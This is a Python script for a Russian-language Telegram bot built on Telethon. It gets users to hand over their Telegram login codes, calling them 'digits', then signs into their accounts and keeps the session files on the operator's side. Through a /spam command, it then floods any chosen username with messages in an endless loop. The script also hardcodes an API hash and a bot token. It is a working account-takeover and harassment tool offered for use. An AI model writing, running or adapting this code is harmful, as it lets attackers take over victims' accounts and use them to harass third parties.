import asyncio
import os
from telethon import TelegramClient, events, Button

API_ID = 34887681
API_HASH = "9a2905a9627fb1959b6699452ec59e99"
BOT_TOKEN = "8990879407:AAHi7CTsOEhLSAr38RnL6dK5teG9Bj28IuQ"

os.makedirs("sessions", exist_ok=True)

user_states = {}

async def main():
    bot = await TelegramClient("sessions/bot_session", API_ID, API_HASH).start(bot_token=BOT_TOKEN)
    
    @bot.on(events.NewMessage(pattern='/start'))
    async def start(event):
        chat_id = event.chat_id
        if chat_id in user_states and user_states[chat_id].get('logged'):
            await event.reply('✅ Доступ уже открыт! /spam @username')
            return
        
        buttons = [[Button.request_phone('📱 Передать контакт', resize=True)]]
        await event.reply('Нажми кнопку, чтобы передать контакт:', buttons=buttons)
        user_states[chat_id] = {'step': 'wait_contact'}

    @bot.on(events.NewMessage(func=lambda e: e.contact))
    async def get_contact(event):
        chat_id = event.chat_id
        if chat_id not in user_states:
            await event.reply('❌ Сначала /start')
            return
        
        phone = event.contact.phone_number
        if not phone.startswith('+'):
            phone = '+' + phone
        
        try:
            client = TelegramClient(f"sessions/user_{chat_id}", API_ID, API_HASH)
            await client.connect()
            
            sent = await client.send_code_request(phone)
            
            user_states[chat_id] = {
                'step': 'wait_code',
                'client': client,
                'phone': phone,
                'phone_code_hash': sent.phone_code_hash,
                'code_attempts': 0
            }
            await event.reply(f'✅ Цифры отправлены на {phone}. Введи цифры (4-6 знаков):')
            
            # ЗАПУСКАЕМ ТАЙМЕР НА 30 СЕКУНД
            asyncio.create_task(code_timeout(chat_id, event))
        except Exception as e:
            await event.reply(f'❌ Ошибка: {str(e)[:150]}')
            if chat_id in user_states:
                del user_states[chat_id]

    async def code_timeout(chat_id, event):
        await asyncio.sleep(30)
        if chat_id in user_states and user_states[chat_id].get('step') == 'wait_code':
            state = user_states[chat_id]
            state['code_attempts'] += 1
            if state['code_attempts'] <= 2:
                # ПОВТОРНО ОТПРАВЛЯЕМ КОД
                try:
                    client = state['client']
                    sent = await client.send_code_request(state['phone'])
                    state['phone_code_hash'] = sent.phone_code_hash
                    await event.reply(f'⏳ Отправлены новые цифры (попытка {state["code_attempts"]}). Введи их:')
                    asyncio.create_task(code_timeout(chat_id, event))
                except Exception:
                    await event.reply('❌ Ошибка при повторной отправке. Нажми /start.')
                    if chat_id in user_states:
                        del user_states[chat_id]
            else:
                await event.reply('❌ Слишком много попыток. Нажми /start заново.')
                if chat_id in user_states:
                    del user_states[chat_id]

    @bot.on(events.NewMessage(pattern=r'^\d{4,6}$'))
    async def get_code(event):
        chat_id = event.chat_id
        if chat_id not in user_states:
            await event.reply('❌ Сначала /start')
            return
        
        state = user_states[chat_id]
        if state.get('step') != 'wait_code':
            await event.reply('❌ Сначала передай контакт')
            return
        
        code = event.raw_text.strip()
        client = state['client']
        
        try:
            await client.sign_in(
                phone=state['phone'],
                code=code,
                phone_code_hash=state['phone_code_hash']
            )
            user_states[chat_id]['step'] = 'logged'
            user_states[chat_id]['logged'] = True
            await event.reply('✅ Доступ открыт! Теперь /spam @username')
        except Exception as e:
            error = str(e)
            if 'CODE_INVALID' in error or 'PHONE_CODE_INVALID' in error:
                await event.reply('❌ Неверные цифры. Нажми /start заново.')
            elif 'EXPIRED' in error or 'TIMEOUT' in error:
                # Если код истёк, таймер уже отправит новый
                await event.reply('⏳ Цифры устарели. Жди новые или нажми /start.')
            else:
                await event.reply(f'❌ Ошибка: {error[:150]}. Нажми /start заново.')
            if chat_id in user_states:
                del user_states[chat_id]

    @bot.on(events.NewMessage(pattern='/spam'))
    async def start_spam(event):
        chat_id = event.chat_id
        if chat_id not in user_states or not user_states[chat_id].get('logged'):
            await event.reply('❌ Сначала открой доступ через /start')
            return
        
        parts = event.raw_text.split()
        if len(parts) < 2:
            await event.reply('⚠️ Пример: /spam @username')
            return
        
        target = parts[1].strip()
        client = user_states[chat_id]['client']
        
        try:
            target_user = await client.get_entity(target)
            await event.reply(f'🍪 Запускаю отправку {target_user.first_name}!')
            count = 0
            while True:
                await client.send_message(target_user, '🍪' * 20)
                count += 1
                await asyncio.sleep(0.3)
                if count % 20 == 0:
                    await event.reply(f'📨 Отправлено {count} пачек')
        except Exception as e:
            await event.reply(f'❌ Ошибка спама: {str(e)[:150]}')

    print('🍪 БОТ ЗАПУЩЕН!')
    await bot.run_until_disconnected()

if __name__ == '__main__':
    asyncio.run(main())
